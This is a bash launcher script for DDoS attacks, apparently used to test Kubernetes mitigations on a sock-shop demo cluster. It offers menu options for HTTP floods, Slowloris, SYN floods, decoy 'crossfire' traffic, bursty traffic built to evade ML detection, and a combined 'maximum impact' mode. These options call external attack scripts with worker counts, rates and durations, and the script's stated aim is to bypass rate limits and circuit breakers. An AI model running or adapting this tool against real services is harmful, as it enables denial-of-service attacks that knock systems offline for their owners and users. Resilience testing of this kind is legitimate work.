#!/bin/bash
# Enhanced Attack Configurations for Testing Mitigation Effectiveness
# These attacks are designed to bypass or overwhelm native Kubernetes mitigations

set -e

TARGET_URL="${1:-http://192.168.49.2:30001}"

echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ENHANCED DDOS ATTACK CONFIGURATIONS                       ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
echo "Target: $TARGET_URL"
echo ""
echo "Choose attack configuration:"
echo ""
echo "  1) Overwhelming Volume (5,000 req/s)"
echo "  2) Resource Exhaustion (Slowloris)"
echo "  3) Connection Pool Exhaustion (SYN Flood)"
echo "  4) Multi-Vector Crossfire"
echo "  5) Adaptive Attack (Mimics Legitimate Traffic)"
echo "  6) 💥 MAXIMUM IMPACT (All Combined)"
echo "  7) Custom Parameters"
echo ""
read -p "Select (1-7): " choice

case $choice in
    1)
        echo ""
        echo "🚨 OVERWHELMING VOLUME ATTACK"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Config: 100 workers × 50 req/s = 5,000 req/s"
        echo "Duration: 10 minutes (600s)"
        echo "Target: Rate limit bypass (500 req/s → 5,000 req/s)"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        read -p "Press Enter to launch attack..."
        
        python3 attack.py \
            --target-url "$TARGET_URL" \
            --attack-type http-flood \
            --workers 100 \
            --rate 50 \
            --duration 600
        ;;
        
    2)
        echo ""
        echo "🐌 RESOURCE EXHAUSTION ATTACK (Slowloris)"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Config: 200 workers × 1 req/s (slow connections)"
        echo "Duration: 15 minutes (900s)"
        echo "Target: Memory exhaustion, circuit breaker bypass"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        read -p "Press Enter to launch attack..."
        
        python3 attack.py \
            --target-url "$TARGET_URL" \
            --attack-type slowloris \
            --workers 200 \
            --rate 1 \
            --duration 900
        ;;
        
    3)
        echo ""
        echo "🔌 CONNECTION POOL EXHAUSTION (SYN Flood)"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Config: 500 workers × 10 req/s (rapid connect/disconnect)"
        echo "Duration: 10 minutes (600s)"
        echo "Target: Circuit breaker exhaustion (100 → 500 connections)"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        read -p "Press Enter to launch attack..."
        
        python3 attack.py \
            --target-url "$TARGET_URL" \
            --attack-type syn \
            --workers 500 \
            --rate 10 \
            --duration 600
        ;;
        
    4)
        echo ""
        echo "🎯 MULTI-VECTOR CROSSFIRE ATTACK"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Config: 50 workers attacking decoys + 50 workers attacking front-end"
        echo "Duration: 15 minutes (900s)"
        echo "Target: Distributed load, network saturation"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "This will launch TWO attacks simultaneously:"
        echo "  1. Crossfire attack on decoy services"
        echo "  2. HTTP flood on front-end"
        echo ""
        read -p "Press Enter to launch attacks..."
        
        # Launch crossfire attack in background
        python3 crossfire-app-level.py \
            --target-url "$TARGET_URL" \
            --duration 900 \
            --rate 100 \
            --workers 50 \
            --decoy-limit 10 &
        
        CROSSFIRE_PID=$!
        echo "Crossfire attack launched (PID: $CROSSFIRE_PID)"
        
        # Wait a bit then launch front-end attack
        sleep 5
        
        python3 attack.py \
            --target-url "$TARGET_URL" \
            --attack-type http-flood \
            --workers 50 \
            --rate 50 \
            --duration 900
        
        # Wait for crossfire to complete
        wait $CROSSFIRE_PID
        ;;
        
    5)
        echo ""
        echo "🤖 ADAPTIVE ATTACK (Mimics Legitimate Traffic)"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Config: Variable rate (400-2000 req/s) with bursts"
        echo "Duration: 30 minutes (1800s)"
        echo "Target: ML detection bypass, sustained pressure"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        read -p "Press Enter to launch attack..."
        
        # Use trained attack patterns if available
        if [ -f "trained-attack-patterns.py" ]; then
            python3 trained-attack-patterns.py \
                --target-url "$TARGET_URL" \
                --pattern SYNFlood \
                --duration 1800 \
                --workers 60
        else
            # Fallback: periodic bursts
            echo "Running periodic burst pattern..."
            for i in {1..30}; do
                echo "Burst $i/30..."
                python3 attack.py \
                    --target-url "$TARGET_URL" \
                    --attack-type http-flood \
                    --workers 60 \
                    --rate 50 \
                    --duration 20 &
                
                sleep 40  # 20s attack + 20s pause = 40s cycle
            done
            wait
        fi
        ;;
        
    6)
        echo ""
        echo "💥 MAXIMUM IMPACT ATTACK (ALL VECTORS COMBINED)"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Config: 250 total workers across 4 attack types"
        echo "Duration: 15 minutes (900s)"
        echo "Target: ALL mitigations simultaneously"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "⚠️  WARNING: This is an aggressive attack!"
        echo "    - May cause service unavailability"
        echo "    - May exhaust cluster resources"
        echo "    - Monitor cluster closely"
        echo ""
        read -p "Are you sure? (yes/no): " confirm
        
        if [ "$confirm" != "yes" ]; then
            echo "Attack cancelled."
            exit 0
        fi
        
        echo ""
        echo "Launching 4 simultaneous attack vectors..."
        
        # Vector 1: Crossfire on decoys
        python3 crossfire-app-level.py \
            --target-url "$TARGET_URL" \
            --duration 900 \
            --rate 100 \
            --workers 100 \
            --decoy-limit 15 &
        
        PID1=$!
        echo "Vector 1 launched (PID: $PID1) - Crossfire on decoys"
        sleep 2
        
        # Vector 2: HTTP flood on front-end
        python3 attack.py \
            --target-url "$TARGET_URL" \
            --attack-type http-flood \
            --workers 100 \
            --rate 100 \
            --duration 900 &
        
        PID2=$!
        echo "Vector 2 launched (PID: $PID2) - HTTP flood on front-end"
        sleep 2
        
        # Vector 3: Slowloris (memory exhaustion)
        python3 attack.py \
            --target-url "$TARGET_URL" \
            --attack-type slowloris \
            --workers 50 \
            --rate 1 \
            --duration 900 &
        
        PID3=$!
        echo "Vector 3 launched (PID: $PID3) - Slowloris (memory)"
        sleep 2
        
        # Vector 4: SYN flood (connection exhaustion)
        python3 attack.py \
            --target-url "$TARGET_URL" \
            --attack-type syn \
            --workers 100 \
            --rate 20 \
            --duration 900 &
        
        PID4=$!
        echo "Vector 4 launched (PID: $PID4) - SYN flood (connections)"
        
        echo ""
        echo "All attack vectors launched!"
        echo "Combined load: ~12,500 req/s"
        echo ""
        echo "Monitor with:"
        echo "  watch -n 2 'kubectl get hpa,pods -n sock-shop'"
        echo "  kubectl top nodes"
        echo "  kubectl top pods -n sock-shop"
        echo ""
        
        # Wait for all attacks to complete
        wait $PID1 $PID2 $PID3 $PID4
        
        echo ""
        echo "All attack vectors completed!"
        ;;
        
    7)
        echo ""
        echo "⚙️  CUSTOM ATTACK CONFIGURATION"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        read -p "Attack type (http-flood/syn/udp/slowloris): " attack_type
        read -p "Number of workers: " workers
        read -p "Requests per second per worker: " rate
        read -p "Duration (seconds): " duration
        
        echo ""
        echo "Configuration:"
        echo "  Type: $attack_type"
        echo "  Workers: $workers"
        echo "  Rate: $rate req/s/worker"
        echo "  Duration: ${duration}s"
        echo "  Total: $((workers * rate)) req/s"
        echo ""
        read -p "Launch attack? (yes/no): " confirm
        
        if [ "$confirm" = "yes" ]; then
            python3 attack.py \
                --target-url "$TARGET_URL" \
                --attack-type "$attack_type" \
                --workers "$workers" \
                --rate "$rate" \
                --duration "$duration"
        fi
        ;;
        
    *)
        echo "Invalid choice"
        exit 1
        ;;
esac

echo ""
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ATTACK COMPLETED                                          ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
echo "Next steps:"
echo "  1. Check service status: kubectl get pods -n sock-shop"
echo "  2. Check HPA scaling: kubectl get hpa -n sock-shop"
echo "  3. Check resource usage: kubectl top pods -n sock-shop"
echo "  4. Check ML detection logs"
echo ""
